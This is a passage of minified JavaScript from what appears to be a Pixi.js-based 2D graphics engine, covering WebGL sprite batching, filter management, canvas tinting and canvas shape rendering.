                    o.uniform2f(t.projectionVector, y.x, y.y);
                    var w = this.renderSession.offset;
                    o.uniform2f(t.offsetVector, w.x, w.y)
                }
                h++
            }
            this.renderBatch(c, h, d), this.currentBatchSize = 0
        }
    }, e.WebGLSpriteBatch.prototype.renderBatch = function(e, t, i) {
        if (0 !== t) {
            var n = this.gl;
            e._dirty[n.id] ? this.renderSession.renderer.updateTexture(e) : n.bindTexture(n.TEXTURE_2D, e._glTextures[n.id]), n.drawElements(n.TRIANGLES, 6 * t, n.UNSIGNED_SHORT, 6 * i * 2), this.renderSession.drawCount++
        }
    }, e.WebGLSpriteBatch.prototype.stop = function() {
        this.flush(), this.dirty = !0
    }, e.WebGLSpriteBatch.prototype.start = function() {
        this.dirty = !0
    }, e.WebGLSpriteBatch.prototype.destroy = function() {
        this.vertices = null, this.indices = null, this.gl.deleteBuffer(this.vertexBuffer), this.gl.deleteBuffer(this.indexBuffer), this.currentBaseTexture = null, this.gl = null
    }, e.WebGLFastSpriteBatch = function(t) {
        this.vertSize = 10, this.maxSize = 6e3, this.size = this.maxSize;
        var i = 4 * this.size * this.vertSize,
            n = 6 * this.maxSize;
        this.vertices = new e.Float32Array(i), this.indices = new e.Uint16Array(n), this.vertexBuffer = null, this.indexBuffer = null, this.lastIndexCount = 0;
        for (var r = 0, o = 0; r < n; r += 6, o += 4) this.indices[r + 0] = o + 0, this.indices[r + 1] = o + 1, this.indices[r + 2] = o + 2, this.indices[r + 3] = o + 0, this.indices[r + 4] = o + 2, this.indices[r + 5] = o + 3;
        this.drawing = !1, this.currentBatchSize = 0, this.currentBaseTexture = null, this.currentBlendMode = 0, this.renderSession = null, this.shader = null, this.matrix = null, this.setContext(t)
    }, e.WebGLFastSpriteBatch.prototype.constructor = e.WebGLFastSpriteBatch, e.WebGLFastSpriteBatch.prototype.setContext = function(e) {
        this.gl = e, this.vertexBuffer = e.createBuffer(), this.indexBuffer = e.createBuffer(), e.bindBuffer(e.ELEMENT_ARRAY_BUFFER, this.indexBuffer), e.bufferData(e.ELEMENT_ARRAY_BUFFER, this.indices, e.STATIC_DRAW), e.bindBuffer(e.ARRAY_BUFFER, this.vertexBuffer), e.bufferData(e.ARRAY_BUFFER, this.vertices, e.DYNAMIC_DRAW)
    }, e.WebGLFastSpriteBatch.prototype.begin = function(e, t) {
        this.renderSession = t, this.shader = this.renderSession.shaderManager.fastShader, this.matrix = e.worldTransform.toArray(!0), this.start()
    }, e.WebGLFastSpriteBatch.prototype.end = function() {
        this.flush()
    }, e.WebGLFastSpriteBatch.prototype.render = function(e) {
        var t = e.children,
            i = t[0];
        if (i.texture._uvs) {
            this.currentBaseTexture = i.texture.baseTexture, i.blendMode !== this.renderSession.blendModeManager.currentBlendMode && (this.flush(), this.renderSession.blendModeManager.setBlendMode(i.blendMode));
            for (var n = 0, r = t.length; n < r; n++) this.renderSprite(t[n]);
            this.flush()
        }
    }, e.WebGLFastSpriteBatch.prototype.renderSprite = function(e) {
        if (e.visible && (e.texture.baseTexture === this.currentBaseTexture || (this.flush(), this.currentBaseTexture = e.texture.baseTexture, e.texture._uvs))) {
            var t, i, n, r, o, a, s = this.vertices;
            if (t = e.texture._uvs, e.texture.frame.width, e.texture.frame.height, e.texture.trim) {
                var l = e.texture.trim;
                i = (n = l.x - e.anchor.x * l.width) + e.texture.crop.width, r = (o = l.y - e.anchor.y * l.height) + e.texture.crop.height
            } else i = e.texture.frame.width * (1 - e.anchor.x), n = e.texture.frame.width * -e.anchor.x, r = e.texture.frame.height * (1 - e.anchor.y), o = e.texture.frame.height * -e.anchor.y;
            a = 4 * this.currentBatchSize * this.vertSize, s[a++] = n, s[a++] = o, s[a++] = e.position.x, s[a++] = e.position.y, s[a++] = e.scale.x, s[a++] = e.scale.y, s[a++] = e.rotation, s[a++] = t.x0, s[a++] = t.y1, s[a++] = e.alpha, s[a++] = i, s[a++] = o, s[a++] = e.position.x, s[a++] = e.position.y, s[a++] = e.scale.x, s[a++] = e.scale.y, s[a++] = e.rotation, s[a++] = t.x1, s[a++] = t.y1, s[a++] = e.alpha, s[a++] = i, s[a++] = r, s[a++] = e.position.x, s[a++] = e.position.y, s[a++] = e.scale.x, s[a++] = e.scale.y, s[a++] = e.rotation, s[a++] = t.x2, s[a++] = t.y2, s[a++] = e.alpha, s[a++] = n, s[a++] = r, s[a++] = e.position.x, s[a++] = e.position.y, s[a++] = e.scale.x, s[a++] = e.scale.y, s[a++] = e.rotation, s[a++] = t.x3, s[a++] = t.y3, s[a++] = e.alpha, this.currentBatchSize++, this.currentBatchSize >= this.size && this.flush()
        }
    }, e.WebGLFastSpriteBatch.prototype.flush = function() {
        if (0 !== this.currentBatchSize) {
            var e = this.gl;
            if (this.currentBaseTexture._glTextures[e.id] || this.renderSession.renderer.updateTexture(this.currentBaseTexture, e), e.bindTexture(e.TEXTURE_2D, this.currentBaseTexture._glTextures[e.id]), this.currentBatchSize > .5 * this.size) e.bufferSubData(e.ARRAY_BUFFER, 0, this.vertices);
            else {
                var t = this.vertices.subarray(0, 4 * this.currentBatchSize * this.vertSize);
                e.bufferSubData(e.ARRAY_BUFFER, 0, t)
            }
            e.drawElements(e.TRIANGLES, 6 * this.currentBatchSize, e.UNSIGNED_SHORT, 0), this.currentBatchSize = 0, this.renderSession.drawCount++
        }
    }, e.WebGLFastSpriteBatch.prototype.stop = function() {
        this.flush()
    }, e.WebGLFastSpriteBatch.prototype.start = function() {
        var e = this.gl;
        e.activeTexture(e.TEXTURE0), e.bindBuffer(e.ARRAY_BUFFER, this.vertexBuffer), e.bindBuffer(e.ELEMENT_ARRAY_BUFFER, this.indexBuffer);
        var t = this.renderSession.projection;
        e.uniform2f(this.shader.projectionVector, t.x, t.y), e.uniformMatrix3fv(this.shader.uMatrix, !1, this.matrix);
        var i = 4 * this.vertSize;
        e.vertexAttribPointer(this.shader.aVertexPosition, 2, e.FLOAT, !1, i, 0), e.vertexAttribPointer(this.shader.aPositionCoord, 2, e.FLOAT, !1, i, 8), e.vertexAttribPointer(this.shader.aScale, 2, e.FLOAT, !1, i, 16), e.vertexAttribPointer(this.shader.aRotation, 1, e.FLOAT, !1, i, 24), e.vertexAttribPointer(this.shader.aTextureCoord, 2, e.FLOAT, !1, i, 28), e.vertexAttribPointer(this.shader.colorAttribute, 1, e.FLOAT, !1, i, 36)
    }, e.WebGLFilterManager = function() {
        this.filterStack = [], this.offsetX = 0, this.offsetY = 0
    }, e.WebGLFilterManager.prototype.constructor = e.WebGLFilterManager, e.WebGLFilterManager.prototype.setContext = function(e) {
        this.gl = e, this.texturePool = [], this.initShaderBuffers()
    }, e.WebGLFilterManager.prototype.begin = function(e, t) {
        this.renderSession = e, this.defaultShader = e.shaderManager.defaultShader;
        var i = this.renderSession.projection;
        this.width = 2 * i.x, this.height = 2 * -i.y, this.buffer = t
    }, e.WebGLFilterManager.prototype.pushFilter = function(t) {
        var i = this.gl,
            n = this.renderSession.projection,
            r = this.renderSession.offset;
        t._filterArea = t.target.filterArea || t.target.getBounds(), this.filterStack.push(t);
        var o = t.filterPasses[0];
        this.offsetX += t._filterArea.x, this.offsetY += t._filterArea.y;
        var a = this.texturePool.pop();
        a ? a.resize(this.width, this.height) : a = new e.FilterTexture(this.gl, this.width, this.height), i.bindTexture(i.TEXTURE_2D, a.texture);
        var s = t._filterArea,
            l = o.padding;
        s.x -= l, s.y -= l, s.width += 2 * l, s.height += 2 * l, s.x < 0 && (s.x = 0), s.width > this.width && (s.width = this.width), s.y < 0 && (s.y = 0), s.height > this.height && (s.height = this.height), i.bindFramebuffer(i.FRAMEBUFFER, a.frameBuffer), i.viewport(0, 0, s.width, s.height), n.x = s.width / 2, n.y = -s.height / 2, r.x = -s.x, r.y = -s.y, i.colorMask(!0, !0, !0, !0), i.clearColor(0, 0, 0, 0), i.clear(i.COLOR_BUFFER_BIT), t._glFilterTexture = a
    }, e.WebGLFilterManager.prototype.popFilter = function() {
        var t = this.gl,
            i = this.filterStack.pop(),
            n = i._filterArea,
            r = i._glFilterTexture,
            o = this.renderSession.projection,
            a = this.renderSession.offset;
        if (i.filterPasses.length > 1) {
            t.viewport(0, 0, n.width, n.height), t.bindBuffer(t.ARRAY_BUFFER, this.vertexBuffer), this.vertexArray[0] = 0, this.vertexArray[1] = n.height, this.vertexArray[2] = n.width, this.vertexArray[3] = n.height, this.vertexArray[4] = 0, this.vertexArray[5] = 0, this.vertexArray[6] = n.width, this.vertexArray[7] = 0, t.bufferSubData(t.ARRAY_BUFFER, 0, this.vertexArray), t.bindBuffer(t.ARRAY_BUFFER, this.uvBuffer), this.uvArray[2] = n.width / this.width, this.uvArray[5] = n.height / this.height, this.uvArray[6] = n.width / this.width, this.uvArray[7] = n.height / this.height, t.bufferSubData(t.ARRAY_BUFFER, 0, this.uvArray);
            var s = r,
                l = this.texturePool.pop();
            l || (l = new e.FilterTexture(this.gl, this.width, this.height)), l.resize(this.width, this.height), t.bindFramebuffer(t.FRAMEBUFFER, l.frameBuffer), t.clear(t.COLOR_BUFFER_BIT), t.disable(t.BLEND);
            for (var h = 0; h < i.filterPasses.length - 1; h++) {
                var d = i.filterPasses[h];
                t.bindFramebuffer(t.FRAMEBUFFER, l.frameBuffer), t.activeTexture(t.TEXTURE0), t.bindTexture(t.TEXTURE_2D, s.texture), this.applyFilterPass(d, n, n.width, n.height);
                var c = s;
                s = l, l = c
            }
            t.enable(t.BLEND), r = s, this.texturePool.push(l)
        }
        var u = i.filterPasses[i.filterPasses.length - 1];
        this.offsetX -= n.x, this.offsetY -= n.y;
        var f = this.width,
            p = this.height,
            g = 0,
            v = 0,
            m = this.buffer;
        if (0 === this.filterStack.length) t.colorMask(!0, !0, !0, !0);
        else {
            var y = this.filterStack[this.filterStack.length - 1];
            f = (n = y._filterArea).width, p = n.height, g = n.x, v = n.y, m = y._glFilterTexture.frameBuffer
        }
        o.x = f / 2, o.y = -p / 2, a.x = g, a.y = v;
        var w = (n = i._filterArea).x - g,
            S = n.y - v;
        t.bindBuffer(t.ARRAY_BUFFER, this.vertexBuffer), this.vertexArray[0] = w, this.vertexArray[1] = S + n.height, this.vertexArray[2] = w + n.width, this.vertexArray[3] = S + n.height, this.vertexArray[4] = w, this.vertexArray[5] = S, this.vertexArray[6] = w + n.width, this.vertexArray[7] = S, t.bufferSubData(t.ARRAY_BUFFER, 0, this.vertexArray), t.bindBuffer(t.ARRAY_BUFFER, this.uvBuffer), this.uvArray[2] = n.width / this.width, this.uvArray[5] = n.height / this.height, this.uvArray[6] = n.width / this.width, this.uvArray[7] = n.height / this.height, t.bufferSubData(t.ARRAY_BUFFER, 0, this.uvArray), t.viewport(0, 0, f, p), t.bindFramebuffer(t.FRAMEBUFFER, m), t.activeTexture(t.TEXTURE0), t.bindTexture(t.TEXTURE_2D, r.texture), this.applyFilterPass(u, n, f, p), this.texturePool.push(r), i._glFilterTexture = null
    }, e.WebGLFilterManager.prototype.applyFilterPass = function(t, i, n, r) {
        var o = this.gl,
            a = t.shaders[o.id];
        a || ((a = new e.PixiShader(o)).fragmentSrc = t.fragmentSrc, a.uniforms = t.uniforms, a.init(), t.shaders[o.id] = a), this.renderSession.shaderManager.setShader(a), o.uniform2f(a.projectionVector, n / 2, -r / 2), o.uniform2f(a.offsetVector, 0, 0), t.uniforms.dimensions && (t.uniforms.dimensions.value[0] = this.width, t.uniforms.dimensions.value[1] = this.height, t.uniforms.dimensions.value[2] = this.vertexArray[0], t.uniforms.dimensions.value[3] = this.vertexArray[5]), a.syncUniforms(), o.bindBuffer(o.ARRAY_BUFFER, this.vertexBuffer), o.vertexAttribPointer(a.aVertexPosition, 2, o.FLOAT, !1, 0, 0), o.bindBuffer(o.ARRAY_BUFFER, this.uvBuffer), o.vertexAttribPointer(a.aTextureCoord, 2, o.FLOAT, !1, 0, 0), o.bindBuffer(o.ARRAY_BUFFER, this.colorBuffer), o.vertexAttribPointer(a.colorAttribute, 2, o.FLOAT, !1, 0, 0), o.bindBuffer(o.ELEMENT_ARRAY_BUFFER, this.indexBuffer), o.drawElements(o.TRIANGLES, 6, o.UNSIGNED_SHORT, 0), this.renderSession.drawCount++
    }, e.WebGLFilterManager.prototype.initShaderBuffers = function() {
        var t = this.gl;
        this.vertexBuffer = t.createBuffer(), this.uvBuffer = t.createBuffer(), this.colorBuffer = t.createBuffer(), this.indexBuffer = t.createBuffer(), this.vertexArray = new e.Float32Array([0, 0, 1, 0, 0, 1, 1, 1]), t.bindBuffer(t.ARRAY_BUFFER, this.vertexBuffer), t.bufferData(t.ARRAY_BUFFER, this.vertexArray, t.STATIC_DRAW), this.uvArray = new e.Float32Array([0, 0, 1, 0, 0, 1, 1, 1]), t.bindBuffer(t.ARRAY_BUFFER, this.uvBuffer), t.bufferData(t.ARRAY_BUFFER, this.uvArray, t.STATIC_DRAW), this.colorArray = new e.Float32Array([1, 16777215, 1, 16777215, 1, 16777215, 1, 16777215]), t.bindBuffer(t.ARRAY_BUFFER, this.colorBuffer), t.bufferData(t.ARRAY_BUFFER, this.colorArray, t.STATIC_DRAW), t.bindBuffer(t.ELEMENT_ARRAY_BUFFER, this.indexBuffer), t.bufferData(t.ELEMENT_ARRAY_BUFFER, new Uint16Array([0, 1, 2, 1, 3, 2]), t.STATIC_DRAW)
    }, e.WebGLFilterManager.prototype.destroy = function() {
        var e = this.gl;
        this.filterStack = null, this.offsetX = 0, this.offsetY = 0;
        for (var t = 0; t < this.texturePool.length; t++) this.texturePool[t].destroy();
        this.texturePool = null, e.deleteBuffer(this.vertexBuffer), e.deleteBuffer(this.uvBuffer), e.deleteBuffer(this.colorBuffer), e.deleteBuffer(this.indexBuffer)
    }, e.FilterTexture = function(t, i, n, r) {
        this.gl = t, this.frameBuffer = t.createFramebuffer(), this.texture = t.createTexture(), r = r || e.scaleModes.DEFAULT, t.bindTexture(t.TEXTURE_2D, this.texture), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MAG_FILTER, r === e.scaleModes.LINEAR ? t.LINEAR : t.NEAREST), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_MIN_FILTER, r === e.scaleModes.LINEAR ? t.LINEAR : t.NEAREST), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_WRAP_S, t.CLAMP_TO_EDGE), t.texParameteri(t.TEXTURE_2D, t.TEXTURE_WRAP_T, t.CLAMP_TO_EDGE), t.bindFramebuffer(t.FRAMEBUFFER, this.frameBuffer), t.bindFramebuffer(t.FRAMEBUFFER, this.frameBuffer), t.framebufferTexture2D(t.FRAMEBUFFER, t.COLOR_ATTACHMENT0, t.TEXTURE_2D, this.texture, 0), this.renderBuffer = t.createRenderbuffer(), t.bindRenderbuffer(t.RENDERBUFFER, this.renderBuffer), t.framebufferRenderbuffer(t.FRAMEBUFFER, t.DEPTH_STENCIL_ATTACHMENT, t.RENDERBUFFER, this.renderBuffer), this.resize(i, n)
    }, e.FilterTexture.prototype.constructor = e.FilterTexture, e.FilterTexture.prototype.clear = function() {
        var e = this.gl;
        e.clearColor(0, 0, 0, 0), e.clear(e.COLOR_BUFFER_BIT)
    }, e.FilterTexture.prototype.resize = function(t, i) {
        if (this.width !== t || this.height !== i) {
            try {
                void 0 !== this._lastSize && (e.frvrTextureMemoryUsage -= 4 * this._lastSize.w * this._lastSize.h)
            } catch (e) {}
            this.width = t, this.height = i;
            var n = this.gl;
            n.bindTexture(n.TEXTURE_2D, this.texture), n.texImage2D(n.TEXTURE_2D, 0, n.RGBA, t, i, 0, n.RGBA, n.UNSIGNED_BYTE, null);
            try {
                e.frvrTextureMemoryUsage += 4 * t * i, this._lastSize = {
                    w: t,
                    h: i
                }
            } catch (e) {}
            n.bindRenderbuffer(n.RENDERBUFFER, this.renderBuffer), n.renderbufferStorage(n.RENDERBUFFER, n.DEPTH_STENCIL, t, i)
        }
    }, e.FilterTexture.prototype.destroy = function() {
        var e = this.gl;
        e.deleteFramebuffer(this.frameBuffer), e.deleteTexture(this.texture), this.frameBuffer = null, this.texture = null
    }, e.CanvasBuffer = function(e, t) {
        this.width = e, this.height = t, this.canvas = document.createElement("canvas"), this.context = this.canvas.getContext("2d"), this.canvas.width = e, this.canvas.height = t
    }, e.CanvasBuffer.prototype.constructor = e.CanvasBuffer, e.CanvasBuffer.prototype.clear = function() {
        this.context.setTransform(1, 0, 0, 1, 0, 0), this.context.clearRect(0, 0, this.width, this.height)
    }, e.CanvasBuffer.prototype.resize = function(e, t) {
        this.width = this.canvas.width = e, this.height = this.canvas.height = t
    }, e.CanvasMaskManager = function() {}, e.CanvasMaskManager.prototype.constructor = e.CanvasMaskManager, e.CanvasMaskManager.prototype.pushMask = function(t, i) {
        var n = i.context;
        n.save();
        var r = t.alpha,
            o = t.worldTransform;
        n.setTransform(o.a, o.b, o.c, o.d, o.tx, o.ty), e.CanvasGraphics.renderGraphicsMask(t, n), n.clip(), t.worldAlpha = r
    }, e.CanvasMaskManager.prototype.popMask = function(e) {
        e.context.restore()
    }, e.CanvasTinter = function() {}, e.CanvasTinter.getTintedTexture = function(t, i) {
        var n = t.texture,
            r = "#" + ("00000" + (0 | (i = e.CanvasTinter.roundColor(i))).toString(16)).substr(-6);
        if (n.tintCache = n.tintCache || {}, n.tintCache[r]) return n.tintCache[r];
        var o = e.CanvasTinter.canvas || document.createElement("canvas");
        if (e.CanvasTinter.tintMethod(n, i, o), e.CanvasTinter.convertTintToImage) {
            var a = new Image;
            a.src = o.toDataURL(), n.tintCache[r] = a
        } else n.tintCache[r] = o, e.CanvasTinter.canvas = null;
        return o
    }, e.CanvasTinter.tintWithPerPixelInner = function(t, i, n, r) {
        var o = i.getContext("2d");
        i.width = r.width, i.height = r.height, o.clearRect(0, 0, i.width, i.height), o.globalCompositeOperation = "copy", o.drawImage(t, r.x, r.y, r.width, r.height, 0, 0, r.width, r.height);
        for (var a = e.hex2rgb(n), s = a[0], l = a[1], h = a[2], d = o.getImageData(0, 0, r.width, r.height), c = d.data, u = 0; u < c.length; u += 4) c[u + 0] = c[u + 0] * s >> 0, c[u + 1] = c[u + 1] * l >> 0, c[u + 2] = c[u + 2] * h >> 0;
        o.putImageData(d, 0, 0)
    }, e.CanvasTinter.tintWithPerPixel = function(t, i, n) {
        e.CanvasTinter.tintWithPerPixelInner(t.baseTexture.source, n, i, t.crop)
    }, e.CanvasTinter.roundColor = function(t) {
        var i = e.CanvasTinter.cacheStepsPerColorChannel,
            n = e.hex2rgb(t);
        return n[0] = Math.min(255, n[0] / i * i), n[1] = Math.min(255, n[1] / i * i), n[2] = Math.min(255, n[2] / i * i), e.rgb2hex(n)
    }, e.CanvasTinter.cacheStepsPerColorChannel = 8, e.CanvasTinter.convertTintToImage = !1, e.CanvasTinter.canUseMultiply = e.canUseNewCanvasBlendModes(), e.CanvasTinter.tintMethod = e.CanvasTinter.tintWithPerPixel, e.CanvasRenderer = function(t, i, n) {
        if (n)
            for (var r in e.defaultRenderOptions) void 0 === n[r] && (n[r] = e.defaultRenderOptions[r]);
        else n = e.defaultRenderOptions;
        e.defaultRenderer || (e.defaultRenderer = this), this.type = e.CANVAS_RENDERER, this.clearBeforeRender = n.clearBeforeRender, this.transparent = n.transparent, this.autoResize = n.autoResize || !1, this.width = t || 800, this.height = i || 600, this.view = n.view || document.createElement("canvas"), this.context = this.view.getContext("2d", {
            alpha: this.transparent
        }), this.refresh = !0, this.count = 0, this.maskManager = new e.CanvasMaskManager, this.renderSession = {
            context: this.context,
            maskManager: this.maskManager,
            scaleMode: null,
            smoothProperty: null
        }, this.mapBlendModes(), this.resize(t, i), "imageSmoothingEnabled" in this.context ? this.renderSession.smoothProperty = "imageSmoothingEnabled" : "webkitImageSmoothingEnabled" in this.context ? this.renderSession.smoothProperty = "webkitImageSmoothingEnabled" : "mozImageSmoothingEnabled" in this.context ? this.renderSession.smoothProperty = "mozImageSmoothingEnabled" : "oImageSmoothingEnabled" in this.context ? this.renderSession.smoothProperty = "oImageSmoothingEnabled" : "msImageSmoothingEnabled" in this.context && (this.renderSession.smoothProperty = "msImageSmoothingEnabled")
    }, e.CanvasRenderer.prototype.constructor = e.CanvasRenderer, e.CanvasRenderer.prototype.render = function(t) {
        t.updateTransform(), this.context.setTransform(1, 0, 0, 1, 0, 0), this.context.globalAlpha = 1, this.renderSession.currentBlendMode = e.blendModes.NORMAL, this.context.globalCompositeOperation = e.blendModesCanvas[e.blendModes.NORMAL], this.renderDisplayObject(t), t.interactive && (t._interactiveEventsAdded || (t._interactiveEventsAdded = !0, t.interactionManager.setTarget(this)))
    }, e.CanvasRenderer.prototype.destroy = function(e) {
        void 0 === e && (e = !0), e && this.view.parent && this.view.parent.removeChild(this.view), this.view = null, this.context = null, this.maskManager = null, this.renderSession = null
    }, e.CanvasRenderer.prototype.resize = function(e, t) {
        this.width = e, this.height = t, this.view.width = this.width, this.view.height = this.height
    }, e.CanvasRenderer.prototype.renderDisplayObject = function(e, t) {
        this.renderSession.context = t || this.context, e._renderCanvas(this.renderSession)
    }, e.CanvasRenderer.prototype.mapBlendModes = function() {
        e.blendModesCanvas || (e.blendModesCanvas = [], e.canUseNewCanvasBlendModes() ? (e.blendModesCanvas[e.blendModes.NORMAL] = "source-over", e.blendModesCanvas[e.blendModes.ADD] = "lighter", e.blendModesCanvas[e.blendModes.MULTIPLY] = "multiply", e.blendModesCanvas[e.blendModes.SCREEN] = "screen") : (e.blendModesCanvas[e.blendModes.NORMAL] = "source-over", e.blendModesCanvas[e.blendModes.ADD] = "lighter", e.blendModesCanvas[e.blendModes.MULTIPLY] = "source-over", e.blendModesCanvas[e.blendModes.SCREEN] = "source-over"))
    }, e.CanvasGraphics = function() {}, e.CanvasGraphics.renderGraphics = function(t, i) {
        var n = t.worldAlpha;
        t.dirty && (this.updateGraphicsTint(t), t.dirty = !1);
        for (var r = 0; r < t.graphicsData.length; r++) {
            var o = t.graphicsData[r],
                a = o.shape,
                s = o._fillTint,
                l = o._lineTint;
            if (i.lineWidth = o.lineWidth, o.type === e.Graphics.POLY) {
                i.beginPath();
                var h = a.points;
                i.moveTo(h[0], h[1]);
                for (var d = 1; d < h.length / 2; d++) i.lineTo(h[2 * d], h[2 * d + 1]);
                a.closed && i.lineTo(h[0], h[1]), h[0] === h[h.length - 2] && h[1] === h[h.length - 1] && i.closePath(), o.fill && (i.globalAlpha = o.fillAlpha * n, i.fillStyle = "#" + ("00000" + (0 | s).toString(16)).substr(-6), i.fill()), o.lineWidth && (i.globalAlpha = o.lineAlpha * n, i.strokeStyle = "#" + ("00000" + (0 | l).toString(16)).substr(-6), i.stroke())
            } else if (o.type === e.Graphics.RECT)(o.fillColor || 0 === o.fillColor) && (i.globalAlpha = o.fillAlpha * n, i.fillStyle = "#" + ("00000" + (0 | s).toString(16)).substr(-6), i.fillRect(a.x, a.y, a.width, a.height)), o.lineWidth && (i.globalAlpha = o.lineAlpha * n, i.strokeStyle = "#" + ("00000" + (0 | l).toString(16)).substr(-6), i.strokeRect(a.x, a.y, a.width, a.height));
            else if (o.type === e.Graphics.CIRC) i.beginPath(), i.arc(a.x, a.y, a.radius, 0, 2 * Math.PI), i.closePath(), o.fill && (i.globalAlpha = o.fillAlpha * n, i.fillStyle = "#" + ("00000" + (0 | s).toString(16)).substr(-6), i.fill()), o.lineWidth && (i.globalAlpha = o.lineAlpha * n, i.strokeStyle = "#" + ("00000" + (0 | l).toString(16)).substr(-6), i.stroke());
            else if (o.type === e.Graphics.ELIP) {
                var c = 2 * a.width,
                    u = 2 * a.height,
                    f = a.x - c / 2,
                    p = a.y - u / 2;
                i.beginPath();
                var g = c / 2 * .5522848,
                    v = u / 2 * .5522848,
                    m = f + c,
                    y = p + u,
                    w = f + c / 2,
                    S = p + u / 2;
                i.moveTo(f, S), i.bezierCurveTo(f, S - v, w - g, p, w, p), i.bezierCurveTo(w + g, p, m, S - v, m, S), i.bezierCurveTo(m, S + v, w + g, y, w, y), i.bezierCurveTo(w - g, y, f, S + v, f, S), i.closePath(), o.fill && (i.globalAlpha = o.fillAlpha * n, i.fillStyle = "#" + ("00000" + (0 | s).toString(16)).substr(-6), i.fill()), o.lineWidth && (i.globalAlpha = o.lineAlpha * n, i.strokeStyle = "#" + ("00000" + (0 | l).toString(16)).substr(-6), i.stroke())
            } else if (o.type === e.Graphics.RREC) {
                var x = a.x,
                    b = a.y,
                    _ = a.width,
                    T = a.height,
                    C = a.radius,
                    R = Math.min(_, T) / 2 | 0;
                C = C > R ? R : C, i.beginPath(), i.moveTo(x, b + C), i.lineTo(x, b + T - C), i.quadraticCurveTo(x, b + T, x + C, b + T), i.lineTo(x + _ - C, b + T), i.quadraticCurveTo(x + _, b + T, x + _, b + T - C), i.lineTo(x + _, b + C), i.quadraticCurveTo(x + _, b, x + _ - C, b), i.lineTo(x + C, b), i.quadraticCurveTo(x, b, x, b + C), i.closePath(), (o.fillColor || 0 === o.fillColor) && (i.globalAlpha = o.fillAlpha * n, i.fillStyle = "#" + ("00000" + (0 | s).toString(16)).substr(-6), i.fill()), o.lineWidth && (i.globalAlpha = o.lineAlpha * n, i.strokeStyle = "#" + ("00000" + (0 | l).toString(16)).substr(-6), i.stroke())
            }
        }
    }, e.CanvasGraphics.renderGraphicsMask = function(t, i) {
        var n = t.graphicsData.length;
        if (0 !== n) {
            n > 1 && (n = 1, window.console.log("Pixi.js warning: masks in canvas can only mask using the first path in the graphics object"));
            for (var r = 0; r < 1; r++) {
                var o = t.graphicsData[r],
                    a = o.shape;
                if (o.type === e.Graphics.POLY) {
                    i.beginPath();
                    var s = a.points;
                    i.moveTo(s[0], s[1]);
                    for (var l = 1; l < s.length / 2; l++) i.lineTo(s[2 * l], s[2 * l + 1]);
                    s[0] === s[s.length - 2] && s[1] === s[s.length - 1] && i.closePath()
                } else if (o.type === e.Graphics.RECT) i.beginPath(), i.rect(a.x, a.y, a.width, a.height), i.closePath();
                else if (o.type === e.Graphics.CIRC) i.beginPath(), i.arc(a.x, a.y, a.radius, 0, 2 * Math.PI), i.closePath();
                else if (o.type === e.Graphics.ELIP) {
                    var h = 2 * a.width,
                        d = 2 * a.height,
                        c = a.x - h / 2,
                        u = a.y - d / 2;
                    i.beginPath();
                    var f = h / 2 * .5522848,
                        p = d / 2 * .5522848,
                        g = c + h,
                        v = u + d,
                        m = c + h / 2,
                        y = u + d / 2;
                    i.moveTo(c, y), i.bezierCurveTo(c, y - p, m - f, u, m, u), i.bezierCurveTo(m + f, u, g, y - p, g, y), i.bezierCurveTo(g, y + p, m + f, v, m, v), i.bezierCurveTo(m - f, v, c, y + p, c, y), i.closePath()
                } else if (o.type === e.Graphics.RREC) {
                    var w = a.points,
                        S = w[0],
                        x = w[1],
                        b = w[2],
                        _ = w[3],
                        T = w[4],
                        C = Math.min(b, _) / 2 | 0;
                    T = T > C ? C : T, i.beginPath(), i.moveTo(S, x + T), i.lineTo(S, x + _ - T), i.quadraticCurveTo(S, x + _, S + T, x + _), i.lineTo(S + b - T, x + _), i.quadraticCurveTo(S + b, x + _, S + b, x + _ - T), i.lineTo(S + b, x + T), i.quadraticCurveTo(S + b, x, S + b - T, x), i.lineTo(S + T, x), i.quadraticCurveTo(S, x, S, x + T), i.closePath()
                }
            }
        }
    }, e.CanvasGraphics.updateGraphicsTint = function(e) {
        if (16777215 !== e.tint)
            for (var t = (e.tint >> 16 & 255) / 255, i = (e.tint >> 8 & 255) / 255, n = (255 & e.tint) / 255, r = 0; r < e.graphicsData.length; r++) {
                var o = e.graphicsData[r],
                    a = 0 | o.fillColor,
                    s = 0 | o.lineColor;
                o._fillTint = ((a >> 16 & 255) / 255 * t * 255 << 16) + ((a >> 8 & 255) / 255 * i * 255 << 8) + (255 & a) / 255 * n * 255, o._lineTint = ((s >> 16 & 255) / 255 * t * 255 << 16) + ((s >> 8 & 255) / 255 * i * 255 << 8) + (255 & s) / 255 * n * 255
            }
    }, e.Graphics = function() {
        e.DisplayObjectContainer.call(this), this.renderable = !0, this.fillAlpha = 1, this.lineWidth = 0, this.lineColor = 0, this.graphicsData = [], this.tint = 16777215, this.ondTint = 16777215, this.blendMode = e.blendModes.NORMAL, this.currentPath = null, this._webGL = [], this.isMask = !1, this.boundsPadding = 0, this._localBounds = new e.Rectangle(0, 0, 1, 1), this.dirty = !0, this.webGLDirty = !1, this.cachedSpriteDirty = !1
    }, e.Graphics.prototype = Object.create(e.DisplayObjectContainer.prototype), e.Graphics.prototype.constructor = e.Graphics, e.Graphics.prototype.lineStyle = function(t, i, n) {
        if (this.lineWidth = t || 0, this.lineColor = i || 0, this.lineAlpha = arguments.length < 3 ? 1 : n, this.currentPath) {
            if (this.currentPath.shape.points.length) return this.drawShape(new e.Polygon(this.currentPath.shape.points.slice(-2))), this;
            this.currentPath.lineWidth = this.lineWidth, this.currentPath.lineColor = this.lineColor, this.currentPath.lineAlpha = this.lineAlpha
        }
        return this
    }, e.Graphics.prototype.moveTo = function(t, i) {
        return this.drawShape(new e.Polygon([t, i])), this
    }, e.Graphics.prototype.lineTo = function(e, t) {
        return this.currentPath.shape.points.push(e, t), this.dirty = !0, this
    }, e.Graphics.prototype.quadraticCurveTo = function(e, t, i, n) {
        this.currentPath ? 0 === this.currentPath.shape.points.length && (this.currentPath.shape.points = [0, 0]) : this.moveTo(0, 0);
        var r, o, a = this.currentPath.shape.points;
        0 === a.length && this.moveTo(0, 0);
        for (var s = a[a.length - 2], l = a[a.length - 1], h = 0, d = 1; d <= 20; d++) r = s + (e - s) * (h = d / 20), o = l + (t - l) * h, a.push(r + (e + (i - e) * h - r) * h, o + (t + (n - t) * h - o) * h);
        return this.dirty = !0, this
    }, e.Graphics.prototype.bezierCurveTo = function(e, t, i, n, r, o) {
